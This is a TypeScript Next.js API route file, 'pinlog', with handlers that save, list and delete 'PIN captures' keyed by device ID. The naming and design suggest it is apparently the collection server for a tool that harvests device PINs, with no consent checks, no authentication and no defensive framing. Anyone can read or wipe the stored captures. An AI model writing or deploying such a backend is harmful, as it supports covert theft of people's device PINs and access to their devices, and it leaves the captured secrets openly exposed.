import { NextRequest, NextResponse } from 'next/server'
import { initSchema } from '@/lib/db'
import { getOrCreateDevice, savePinCapture, getPinCaptures, clearPinCaptures } from '@/lib/store'

export async function POST(req: NextRequest) {
  try {
    await initSchema()
    const body = await req.json()
    const { deviceId, type, value } = body

    if (!deviceId || !value) {
      return NextResponse.json({ error: 'deviceId and value required' }, { status: 400 })
    }

    await getOrCreateDevice(deviceId)
    await savePinCapture(deviceId, type ?? 'pin', value)

    return NextResponse.json({ ok: true })
  } catch (e) {
    console.error('pinlog POST error:', e)
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}

export async function GET(req: NextRequest) {
  try {
    await initSchema()
    const deviceId = req.nextUrl.searchParams.get('deviceId')
    if (!deviceId) return NextResponse.json({ error: 'deviceId required' }, { status: 400 })

    const limit = parseInt(req.nextUrl.searchParams.get('limit') ?? '100')
    const captures = await getPinCaptures(deviceId, limit)

    return NextResponse.json({ captures })
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}

export async function DELETE(req: NextRequest) {
  try {
    await initSchema()
    const deviceId = req.nextUrl.searchParams.get('deviceId')
    if (!deviceId) return NextResponse.json({ error: 'deviceId required' }, { status: 400 })

    await clearPinCaptures(deviceId)
    return NextResponse.json({ ok: true })
  } catch (e) {
    return NextResponse.json({ error: String(e) }, { status: 500 })
  }
}
